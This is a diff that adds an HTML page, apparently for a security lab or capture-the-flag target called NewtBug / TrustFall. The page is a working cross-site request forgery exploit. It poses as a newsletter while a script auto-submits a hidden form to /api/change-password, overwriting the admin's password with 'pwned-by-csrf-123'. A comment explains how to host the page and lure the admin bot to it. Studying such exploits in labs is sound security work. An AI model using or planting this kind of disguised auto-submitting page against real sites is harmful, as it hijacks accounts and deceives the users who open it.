@@ -1,0 +1,22 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>NewtBug Newsletter</title></head>
+<body>
+  <!--
+    CSRF proof-of-concept for the NewtBug / TrustFall task-manager lab.
+
+    Serve this from a DIFFERENT host/IP than the victim app (so the POST is
+    genuinely cross-site), then email the admin bot a link to it. The bot opens
+    it, the form auto-submits a cross-site POST to /api/change-password carrying
+    the admin's session cookie (SameSite=Lax rides the top-level navigation), and
+    the admin password is overwritten — no token, no old password needed.
+
+    Replace VICTIM_IP below with the victim's current IP.
+  -->
+  <h3>Loading your newsletter…</h3>
+  <form id="csrf" action="http://VICTIM_IP/api/change-password" method="POST">
+    <input type="hidden" name="newPassword" value="pwned-by-csrf-123">
+  </form>
+  <script>document.getElementById("csrf").submit();</script>
+</body>
+</html>
